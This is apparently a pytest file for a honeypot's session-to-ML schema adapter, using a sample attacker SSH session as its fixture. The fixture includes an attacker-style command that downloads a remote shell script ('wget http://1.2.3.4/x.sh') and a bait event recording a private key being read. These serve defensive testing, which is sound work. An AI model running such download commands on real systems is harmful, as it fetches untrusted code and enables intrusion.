"""Tests for the core->ML schema adapter (bridge/schema_adapter.py)."""

from __future__ import annotations

import base64

import pytest

from bridge.schema_adapter import (
    CORE_TO_ML_BAIT,
    SchemaAdaptationError,
    core_session_to_ml,
)


def _b64(s: str) -> str:
    return base64.b64encode(s.encode()).decode()


def _core_doc(**overrides):
    """A representative marshaled Go session.Session document."""
    doc = {
        "session_id": "sess-abc-123",
        "schema_version": "1.0",
        "node_id": "Ubuntu",
        "protocol": "ssh",
        "network": {
            "client_ip": "45.61.0.9",
            "client_port": 51000,
            "server_port": 2222,
            "ssh_client_banner": "SSH-2.0-libssh_0.9",
        },
        "timing": {"start_ms": 1_700_000_000_000, "end_ms": 1_700_000_005_000, "duration_ms": 5000},
        "outcome": "clean_disconnect",
        "auth_attempts": [],
        "commands": [
            {
                "event_id": "e1", "sequence_number": 0,
                "timestamp_ms": 1_700_000_000_500, "inter_command_delay_ms": None,
                "raw_input_b64": _b64("uname -a"),
                "parsed_command": "uname", "parsed_args": ["-a"],
                "working_directory": "/home/ubuntu", "response_source": "hardcoded",
            },
            {
                "event_id": "e2", "sequence_number": 1,
                "timestamp_ms": 1_700_000_001_500, "inter_command_delay_ms": 1000,
                "raw_input_b64": _b64("wget http://1.2.3.4/x.sh"),
                "parsed_command": "wget", "parsed_args": ["http://1.2.3.4/x.sh"],
                "working_directory": "/home/ubuntu", "response_source": "hardcoded",
            },
        ],
        "bait_interactions": [
            {
                "event_id": "b1", "timestamp_ms": 1_700_000_002_000,
                "bait_id": "k1", "bait_type": "private_key",
                "access_type": "read", "triggered_by_command_event_id": "e2",
            }
        ],
        "intelligence": {},
    }
    doc.update(overrides)
    return doc


def test_basic_field_mapping():
    s = core_session_to_ml(_core_doc())
    assert s.session_id == "sess-abc-123"
    assert s.ip == "45.61.0.9"
    assert s.duration_ms == 5000
    assert s.n_commands == 2


def test_command_raw_decoded_and_offsets():
    s = core_session_to_ml(_core_doc())
    assert s.commands[0].raw == "uname -a"
    assert s.commands[1].raw == "wget http://1.2.3.4/x.sh"
    # ms_offset = timestamp_ms - start_ms
    assert s.commands[0].ms_offset == 500
    assert s.commands[1].ms_offset == 1500
    # Inter-command delta recovered from offsets.
    assert s.inter_command_deltas_ms() == [1000]


def test_bait_type_mapping():
    s = core_session_to_ml(_core_doc())
    assert len(s.bait_interactions) == 1
    assert s.bait_interactions[0].bait_type == "ssh_key"  # private_key -> ssh_key
    assert CORE_TO_ML_BAIT["env_file"] == "env_file"


def test_raw_fallback_to_parsed_when_no_b64():
    doc = _core_doc()
    doc["commands"][0].pop("raw_input_b64")
    s = core_session_to_ml(doc)
    assert s.commands[0].raw == "uname -a"  # reconstructed from parsed_command + args


def test_empty_commands_are_skipped():
    doc = _core_doc()
    doc["commands"].append(
        {
            "event_id": "e3", "sequence_number": 2,
            "timestamp_ms": 1_700_000_003_000,
            "raw_input_b64": _b64("   "),  # bare whitespace / empty Enter
            "parsed_command": "", "parsed_args": [],
            "working_directory": "/home/ubuntu", "response_source": "no_response",
        }
    )
    s = core_session_to_ml(doc)
    assert s.n_commands == 2  # the blank line dropped


def test_negative_offset_clamped():
    doc = _core_doc()
    # A command stamped slightly before start (clock skew).
    doc["commands"][0]["timestamp_ms"] = doc["timing"]["start_ms"] - 50
    s = core_session_to_ml(doc)
    assert s.commands[0].ms_offset == 0


def test_missing_start_raises():
    doc = _core_doc()
    doc["timing"] = {}
    with pytest.raises(SchemaAdaptationError):
        core_session_to_ml(doc)


def test_missing_session_id_raises():
    doc = _core_doc()
    doc.pop("session_id")
    with pytest.raises(SchemaAdaptationError):
        core_session_to_ml(doc)


def test_missing_network_defaults_ip():
    doc = _core_doc()
    doc.pop("network")
    s = core_session_to_ml(doc)
    assert s.ip == "0.0.0.0"
